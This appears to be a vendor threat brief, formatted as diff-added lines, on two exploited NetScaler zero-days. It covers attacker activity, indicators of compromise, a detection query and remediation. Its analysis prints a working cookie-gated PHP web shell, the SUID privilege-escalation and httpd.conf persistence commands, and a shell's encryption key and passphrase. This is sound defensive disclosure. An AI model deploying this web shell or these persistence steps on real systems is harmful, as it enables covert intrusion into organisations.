@@ -1,0 +1,623 @@
+Threat Research Center
+High Profile Threats
+Vulnerabilities
+Vulnerabilities
+Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30)
+9
+min read
+Related Products
+Advanced Threat Prevention
+Advanced URL Filtering
+Cloud-Delivered Security Services
+Cortex
+Cortex Xpanse
+Next-Generation Firewall
+Unit 42 Incident Response
+By:
+Unit 42
+Published:
+September 30, 2026
+Categories:
+High Profile Threats
+Vulnerabilities
+Tags:
+Citrix
+CVE-2026-88771
+CVE-2026-88772
+Denial of service
+Remote Code Execution
+Zero-day
+Share
+Executive Summary
+Unit 42 is aware of possible zero-day activity against NetScaler devices. In a
+Citrix report that details several CVEs
+, they noted that CVE-2026-88771 and CVE-2026-88772 have been exploited in the wild. The threat actors exploited these vulnerabilities to deliver web shells and establish their initial access and persistence into organizations. Analysis is ongoing to determine any post-compromise activity.
+As of Sept. 27, 2026, Palo Alto Networks Cortex Xpanse has identified 50,277 exposed instances that could potentially be vulnerable to these CVEs based on our telemetry.
+It is important to note that activity after Sept. 27, 2026 might not match the same indicators of compromise (IoCs) or tactics, techniques and procedures (TTPs) from the original zero-day activity. We group pre-disclosure and post-disclosure activities to differentiate what we believe the original actors were doing with the exploit from what additional actors, security researchers and internet scanning tools are doing now that the vulnerabilities are public.
+The vulnerabilities are:
+CVE-2026-88771
+: A remote code execution (RCE) vulnerability that fails to properly validate input and allows an unauthenticated actor to run commands against NetScaler Application Delivery Controller (ADC) and NetScaler Gateway systems
+CVE-2026-88772
+: A memory overflow vulnerability that can lead to a remote code execution (RCE) or denial of service (DoS) on the Datagram Transport Layer Security (DTLS) configuration on NetScaler ADC and NetScaler Gateway systems
+Both vulnerabilities have a CVSS v4.0 base score of 9.5.
+Palo Alto Networks customers are better protected from this activity through our products and services, such as:
+Advanced URL Filtering
+Next-Generation Firewall
+with
+Advanced Threat Prevention
+Cortex XDR
+and
+XSIAM
+The
+Unit 42 Incident Response team
+can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.
+Vulnerabilities Discussed
+CVE-2026-88771
+,
+CVE-2026-88772
+Pre-Disclosure Activity
+This section is our analysis of threat activity that occurred prior to the public disclosure of these zero-day vulnerabilities. We saw two groups of web shell activity:
+Datagram Transport Layer Security (DTLS) exploitation dropping
+.deb
+web shell files
+A three-stage command injection exploit chain that drops PHP web shells
+Initial Activity: Fingerprinting NetScaler Devices
+The earliest activity we identified occurred on Aug. 21, 2026, from two hosts, one at
+104.248.244[.]66
+and one at
+77.83.199[.]39
+. First,
+104.248.244[.]66
+requested
+/admin_ui/common/css/ns/ui.css
+from a NetScaler Gateway appliance at a US-based organization.
+Approximately two hours later, the host at
+77.83.199[.]39
+requested the same file,
+/admin_ui/common/css/ns/ui.css
+. Nearly two hours after that second request,
+77.83.199[.]39
+requested
+/vpn/js/rdx/core/lang/rdx_en.json.gz
+. These requests are consistent with version fingerprinting.
+On August 21 and 22, these two hosts and
+78.47.24[.]217
+sent the same requests to more than 100 other systems.
+CVE-2026-88772: DTLS Exploitation To .deb Webshell Activity
+In this exploit chain, the attacker sends crafted DTLS traffic to a vulnerable NetScaler device, which processes the malicious packet. This malicious packet causes memory corruption or a crash that can lead to either code execution or denial of service.
+Between September 4 and 24, the threat actor repeatedly requested files from the appliance's
+/vpn/scripts/linux/
+folder. This folder normally hosts Citrix client installation packages. The threat actor also used this folder to host their web shells.
+The threat actor rotated its infrastructure over this period:
+September 4–8:
+Four virtual private servers (VPSs), one per day, requested
+nsgclient18.deb
+and
+nsgser18.deb
+. These hosts were
+66.135.19[.]18
+,
+167.99.111[.]203
+,
+142.93.85[.]227
+and
+104.248.74[.]206
+.
+September 7
+:
+137.184.91[.]207
+requested the same files.
+September 9–11
+: Three
+Cloudflare WARP
+VPN addresses requested
+nsgclient18.deb
+,
+nsgsupport.deb
+and
+nsgpackage64.deb
+. These addresses were
+104.28.247[.]136
+,
+104.28.215[.]136
+and
+104.28.215[.]137
+.
+September 14:
+162.33.178[.]9
+requested
+nsgbuild.deb
+and
+nsgsupport.deb
+.
+September 15–24:
+193.149.176[.]207
+requested
+nsgbuild.deb
+every day. This server accounts for most of the requests we observed
+From September 10–27, the WARP addresses (plus two additional IP addresses,
+104.28.247[.]137
+and
+193.149.176[.]207
+) sent a continuous stream of requests to the appliance's
+/logon/LogonPoint/Authentication/GetUserName
+page. We believe any activity to this URL path is anomalous and worth investigating.
+The requests continued around the clock, including on days without web shell activity. They also continued for two and a half days after the last web shell request on September 24.
+The last request arrived at 01:54 UTC on September 27, hours before Citrix published its security bulletin.
+.deb Web Shell Analysis
+We recovered and analyzed
+.deb
+files used in this activity. We analyzed
+nsg64.deb
+(
+ae22ef2517b5c0fb47f78745b9cb5260acee0e751b89bcd354640ff8bc8d29ec
+), which is a web shell written in PHP targeting Citrix NetScaler appliances. This file provides remote command execution, file exfiltration and file upload capabilities.
+All command-and-control communication is RC4-encrypted using the 16-byte key
+7489a0f93c67fa5cdaeb4b921d90594d
+, which is the MD5 hash of the hard-coded passphrase
+Rhfajaf1H992
+. The shell authenticates operators by verifying the
+k
+parameter against the passphrase and leverages the NetScaler SUID binary at
+/var/netscaler/.ns_suidcmd
+for privilege escalation.
+Actor commands arrive through a custom HTTP headers. These headers are retrieved by checking the HTTP
+_xxx
+server variable,
+xxx
+parameters in cookies, GET and POST request parameters, as well as Apache request headers. The command handler in this web shell supports five different commands:
+cmd
+command executes an arbitrary shell command using
+shell_exec
+,
+exec
+,
+passthru
+,
+system
+, and
+popen
+. It returns RC4-encrypted output.
+size
+command returns the size of a specified file determined by running
+wc -c < {filename} 2>/dev/null
+dl
+command exfiltrates files from the target system with chunked transfers via offset and length parameters, enforcing a hard cap of 1,048,576 bytes per request
+up
+command writes data to a specified file path with optional append mode
+info
+command returns the PHP version in the format
+php=PHP_VERSION\nns=4
+CVE-2026-88771: Three Stage Command Injection Exploit to Web Shell Execution
+On September 21, an actor from
+77.83.199[.]39
+,
+78.47.24[.]217
+and
+139.180.152[.]138
+dropped a PHP web shell in a three-stage process against a U.S.-based target’s NetScaler devices.
+Stage 1
+The attacker sends an HTTP request to the NetScaler device with a dropper command encoded as Base64 text in the User-Agent string. The NetScaler device sends back a 404 error as expected, but this User-Agent string is added to the
+/var/log/httpaccess-vpn.log
+.
+Stage 2
+The attacker submits a login request that includes additional text that is logged as a failure message to
+/var/log/ns.log
+as:
+pitboss PPE missed too many heartbeatsNSPPE;<additional text>
+Eventually this
+ns.log
+file will be processed by the vulnerable Perl script at
+/netscaler/ns_monuploadd_err.pl
+.
+Stage 3
+When the Perl script at
+/netscaler/ns_monuploadd_err.pl -WR
+runs, it:
+Picks up the poisoned log entries from the previous stage
+Extracts the additional text inserted after NSPPE
+Runs that text as part of a shell command
+The
+<additional text>
+in this activity uses the
+grep
+command to retrieve the staged Base64 contained in the access log entry from Stage 1. It then decodes the Base64-encoded text and pipes it to
+sh
+or
+php
+, where this decoded text is run as a command.
+Payload Analysis
+Figure 1 shows an example of the PHP web shell we observed being dropped and executed as a Base64 payload in the three-stage process above. We have observed multiple values in place of
+C2
+(e.g.,
+3P
+,
+4B
+) at the beginning of this text and a variable character length.
+Figure 1. Example of PHP web shell dropped and executed as a Base64 payload.
+Figure 2 shows the decoded text from the Base64 payload.
+Figure 2. Decoded text from the Base64 payload.
+What the Commands Do
+Privilege Escalation Bootstrap
+chmod 6555 /bin/sh
+sets the SUID + SGID bits on
+/bin/sh
+. Any unprivileged process that subsequently calls
+/bin/sh
+inherits root UID. This step ensures future commands run as root regardless of the web server's runtime user.
+Establish the Drop Path
+mkdir -p /var/netscaler/logon/LogonPoint/custom
+The directory at
+/var/netscaler/logon/LogonPoint/
+is the NetScaler Gateway web UI root, served directly by the appliance's Apache (
+httpd
+). The
+custom/
+subdirectory is the intended path for customer UI customizations — it is web-accessible by design and often not monitored.
+Deploy the PHP Web Shell
+The file
+.ctxs.receiver
+contains:
+<?php
+header("Cache-Control: no-store, no-cache, must-revalidate");
+header("Pragma: no-cache");
+header("Expires: 0");
+if($_COOKIE["CsrfToken"]==="e826d7ddf3c85920" && !empty($_COOKIE["NSC_TASS"]))
+passthru(urldecode($_COOKIE["NSC_TASS"]));
+?>
+Authentication Gate
+CsrfToken
+cookie must equal the hard-coded value
+e826d7ddf3c85920
+. This is the per-implant password — different intrusions might use different tokens.
+Command Channel
+The
+NSC_TASS
+cookie carries the URL-encoded command to execute.
+Passthru()
+runs it with shell privileges and streams output directly to the HTTP response.
+Stealth Headers
+No-store/no-cache
+directives prevent proxy and browser caching, reducing the chance of detection via cached response analysis.
+Naming Camouflage
+NSC_TASS
+mimics legitimate NetScaler cookie names (
+NSC_*
+is the namespace used by NetScaler for load-balancer session cookies), making it blend into normal appliance traffic.
+Register Web Shell With Apache via httpd.conf Patching
+The
+perl -ni -e
+one-liner surgically edits
+/etc/httpd.conf
+to add two things:
+A
+<Files ".ctxs.receiver">
+block that enables PHP execution for the hidden file and sets anti-caching headers.
+Two
+Alias/AliasMatch
+directives that serve the web shell under a legitimate-looking path:
+Fixed alias:
+/logon/LogonPoint/custom/receiver.min.css
+→ web shell
+Regex alias:
+/logon/LogonPoint/custom/receiver.min.<hex>.css
+→ web shell (any hex suffix)
+The CSS filename disguise is deliberate. Browser developer tools, web application firewall logs and blue team analysts watching HTTP traffic will see what looks like a versioned CSS asset load, which is completely normal for a web application. The
+grep -q
+guard prevents duplicate injection if the persistence mechanism is run again.
+Enable PHP Engine
+The
+perl -pi -e 's/php_flag engine off/php_flag engine on /' /etc/httpd.conf
+one-liner substitutes
+php_flag
+engine off with
+php_flag
+engine on in
+httpd.conf
+to enable PHP, which is required for the web shell to execute. NetScaler's Apache config ships with
+php_flag
+engine off to disable PHP execution globally as a security hardening measure.
+Reload Apache Using Updated Configuration
+The line kill
+-HUP `cat /var/run/httpd.pid`
+sends
+SIGHUP
+to the Apache process, triggering a graceful config reload without dropping active connections. The injected config and PHP engine activation take effect immediately, with no restart log entry and no interruption to legitimate traffic.
+Post-Disclosure Activity
+We saw wide scale scanning and testing for these vulnerabilities once they were publicly disclosed on Sept. 27, 2026. Our analysis is ongoing and we will update this section if we identify novel activity.
+Interim Guidance
+We recommend that customers update their Citrix software to the latest versions as soon as possible, as well as following the recommendations:
+Confirm exposure
+following the “Steps to determine if an appliance meets the CVE preconditions” section of the
+Citrix Security Advisory
+for these vulnerabilities
+Isolate the vulnerable systems
+from the network
+Preserve evidence
+by capturing the following:
+A NetScaler VPX instance snapshot
+Logs on remote syslog servers and NetScaler Console
+A technical support bundle
+A packet engine core dump
+Hunt
+for the following:
+Signs of suspicious administrative sessions
+Unexpected outbound connections
+Unexplained gaps in logging
+Note: These are not TTPs we have observed specifically related to these vulnerabilities. They should be seen as general hunting guidance until more is known about the exploitation activity identified by Citrix in their advisory.
+Update and patch
+to the latest versions
+Note: Updating and patching will not remove access for attackers that have already established persistence within a compromise the network.
+As of Sept. 27, 2026, Palo Alto Networks
+Cortex Xpanse
+has identified the presence of 50,277 exposed instances potentially vulnerable to these CVEs based on our telemetry.
+Unit 42 Managed Threat Hunting Queries
+This query looks for CVE-2026-88771 log poisoning. It does not indicate successful exploitation on patched devices. Unpatched devices will lead to execution if this log poisoning is present on a system.
+dataset = citrix_adc_raw
+| filter _raw_log contains "pitboss"
+| alter log_type = arrayindex(regextract(_raw_log, "<[^>]+>(?:[A-Za-z]{3}[ ]+[0-9]{1,2}[ ]+|[ ]+[0-9]{2}/[0-9]{2}/[0-9]{4}:)[0-9]{2}:[0-9]{2}:[0-9]{2}.+default ([\w]+)"), 0),
+log_sub_type = arrayindex(regextract(_raw_log, "<[^>]+>(?:[A-Za-z]{3}[ ]+[0-9]{1,2}[ ]+|[ ]+[0-9]{2}/[0-9]{2}/[0-9]{4}:)[0-9]{2}:[0-9]{2}:[0-9]{2}.+default [\w]+ ([\w]+)"), 0),
+command_attempted = if(_raw_log contains "PPE unexpectedly died", arrayindex(regextract(_raw_log, "pitboss PPE unexpectedly died NSPPE(?:\-00|)\;(.+)\>, factor"), 0), arrayindex(regextract(_raw_log, "pitboss PPE missed too many heartbeats\s?NSPPE(?:\-00|)\;(.+)\>, factor"), 0))
+| filter command_attempted != null
+| comp earliest(_time) as first_seen, latest(_time) as last_seen, values(log_type) as log_type, count() by command_attempted
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+dataset
+=
+citrix_adc_raw
+|
+filter
+_raw_log
+contains
+"pitboss"
+|
+alter
+log_type
+=
+arrayindex
+(
+regextract
+(
+_raw_log
+,
+"<[^>]+>(?:[A-Za-z]{3}[ ]+[0-9]{1,2}[ ]+|[ ]+[0-9]{2}/[0-9]{2}/[0-9]{4}:)[0-9]{2}:[0-9]{2}:[0-9]{2}.+default ([\w]+)"
+)
+,
+0
+)
+,
+log_sub_type
+=
+arrayindex
+(
+regextract
+(
+_raw_log
+,
+"<[^>]+>(?:[A-Za-z]{3}[ ]+[0-9]{1,2}[ ]+|[ ]+[0-9]{2}/[0-9]{2}/[0-9]{4}:)[0-9]{2}:[0-9]{2}:[0-9]{2}.+default [\w]+ ([\w]+)"
+)
+,
+0
+)
+,
+command_attempted
+=
+if
+(
+_raw_log
+contains
+"PPE unexpectedly died"
+,
+arrayindex
+(
+regextract
+(
+_raw_log
+,
+"pitboss PPE unexpectedly died NSPPE(?:\-00|)\;(.+)\>, factor"
+)
+,
+0
+)
+,
+arrayindex
+(
+regextract
+(
+_raw_log
+,
+"pitboss PPE missed too many heartbeats\s?NSPPE(?:\-00|)\;(.+)\>, factor"
+)
+,
+0
+)
+)
+|
+filter
+command_attempted
+!
+=
+null
+|
+comp
+earliest
+(
+_time
+)
+as
+first_seen
+,
+latest
+(
+_time
+)
+as
+last_seen
+,
+values
+(
+log_type
+)
+as
+log_type
+,
+count
+(
+)
+by
+command_attempted
+Palo Alto Networks Product Protections
+Palo Alto Networks customers can leverage a variety of product protections and updates to identify and defend against this threat.
+If you think you might have been compromised or have an urgent matter, get in touch with the
+Unit 42 Incident Response team
+or call:
+North America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42)
+UK: +44.20.3743.3660
+Europe and Middle East: +31.20.299.3130
+Asia: +65.6983.8730
+Japan: +81.50.1790.0200
+Australia: +61.2.4062.7950
+India: 000 800 050 45107
+South Korea: +82.080.467.8774
+Next-Generation Firewalls With Advanced Threat Prevention
+Next-Generation Firewall
+with the
+Advanced Threat Prevention
+security subscription can help via the following Threat Prevention signature:
+97562
+. This signature is designed to block the exploitation of the CVE-2026-88771 Citrix NetScaler command injection vulnerability
+Cloud-Delivered Security Services for the Next-Generation Firewall
+Advanced URL Filtering
+is designed to identify known IP addresses associated with this activity as malicious.
+Cortex XDR and XSIAM
+Cortex XDR
+and
+XSIAM
+are designed to detect post-exploit activity, including credential-based attacks, with behavioral analytics.
+Cortex Xpanse
+Cortex Xpanse
+has the ability to identify exposed Citrix NetScaler ADC and Gateway devices on the public internet and escalate these findings to defenders. Customers can enable alerting on this risk by ensuring that the InsecureCitrixApplicationDeliveryController Attack Surface Rule is enabled. Identified findings can either be viewed in the Threat Response Center or in the incident view of Expander. These findings are also available for Cortex XSIAM customers who have purchased the ASM module.
+Device Security
+Device Security
+is designed to proactively protect the specialized device attack surface of operational environments, providing deep visibility into industrial protocols, actionable risk insights, and adaptive security enforcement across all OT and IoT assets.
+Additional References
+Citrix NetScaler ADC and Citrix NetScaler Gateway Security Bulletin for CVE-2026-88771, CVE-2026-88772, CVE-2026-88773, CVE-2026-88774, CVE-2026-88775, CVE-2026-88776, CVE-2026-88777, and CVE-2026-88778
+– Security Bulletin, Citrix
+Indicators of Compromise
+Network Indicators
+45.61.136[.]143
+66.227.183[.]84
+77.83.199[.]39
+104.28.215[.]137
+104.248.244[.]66
+104.28.247[.]136
+162.33.178[.]9
+193.149.176[.]207
+216.245.184[.]164
+Host Indicators
+The following are a list of file details associated with web shells dropped after initial compromise.
+/vpn/scripts/linux/nsgclient18.deb
+/vpn/scripts/linux/nsg64.deb
+/var/netscaler/logon/LogonPoint/custom/.ctxs.receiver
+SHA-256 hashes:
+The text in Figures 1 and 2 of this article are represented by text files with the following SHA-256 hashes:
+1bd314b661396c7086f6367fbbb48025e03ca2de69c073d53a8b0a38aa5fbb7d
+- Base64 payload
+79c65fa04541032e251fa4796b97800374b63c7982593dd1a2e0db605d429186
+- Decoded shell script
+ae22ef2517b5c0fb47f78745b9cb5260acee0e751b89bcd354640ff8bc8d29ec
+-
+nsg64.deb
+file
+Updated Sept. 27, 2026 at 4:15 p.m. PT to add information about Cortex Xpanse telemetry.
+Updated Sept. 30, 2026, at 3:00 p.m. PT to add information on pre- and post-disclosure activity and threat hunting queries. Additional product protection information was added.
+Updated Oct. 1, 2026 at 1:00 p.m. PT to update MTH queries and add Cortex Xpanse and Device Security product protection information.
+Back to top
+Tags
+Citrix
+CVE-2026-88771
+CVE-2026-88772
+Denial of service
+Remote Code Execution
+Zero-day
+Threat Research Center
+Next: OperTraitors: How Kubernetes Operators Betray Your Security Posture
+Table of Contents
+Related Articles
+The Frontier AI Vulnerability Burst: Industrializing Autonomous Zero-Day Discovery in Open-Source Software
+Threat Brief: Exploitation of PAN-OS Captive Portal Zero-Day for Unauthenticated Remote Code Execution
+Fracturing Software Security With Frontier AI Models
+Related Vulnerabilities Resources
+Insights
+August 4, 2026
+The Frontier AI Vulnerability Burst: Industrializing Autonomous Zero-Day Discovery in Open-Source Software
+AI
+Frontier AI
+Vulnerability Exploitation
+Read now
+Threat Research
+July 30, 2026
+Chinese-Speaking Threat Actor Harnesses AI Models for Autonomous Cyberattacks
+ChatGPT
+Claude code
+CVEs
+Read now
+Threat Research
+July 17, 2026
+Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy
+Command injection
+CVE-2025-40947
+CVE-2025-40948
+Read now
+High Profile Threats
+June 9, 2026
+Threat Brief: Active Exploitation of PAN-OS CVE-2026-0257
+CVE-2026-0257
+Vulnerability
+Read now
+High Profile Threats
+May 6, 2026
+Threat Brief: Exploitation of PAN-OS Captive Portal Zero-Day for Unauthenticated Remote Code Execution
+CVE-2026-0300
+EarthWorm
+PAN-OS
+Read now
+High Profile Threats
+May 5, 2026
+Copy Fail: What You Need to Know About the Most Severe Linux Threat in Years
+Containers
+CVE-2026-31431
+Kubernetes
+Read now
+Threat Research
+April 16, 2026
+A Deep Dive Into Attempted Exploitation of CVE-2023-33538
+Botnet
+Command injection
+CVE-2023-33538
+Read now
+High Profile Threats
+February 19, 2026
+VShell and SparkRAT Observed in Exploitation of BeyondTrust Critical Vulnerability (CVE-2026-1731)
+Bash
+CVE-2026-1731
+PowerShell
+Read now
+High Profile Threats
+February 17, 2026
+Critical Vulnerabilities in Ivanti EPMM Exploited
+CVE-2026-1281
+CVE-2026-1340
+Ivanti
+Read now
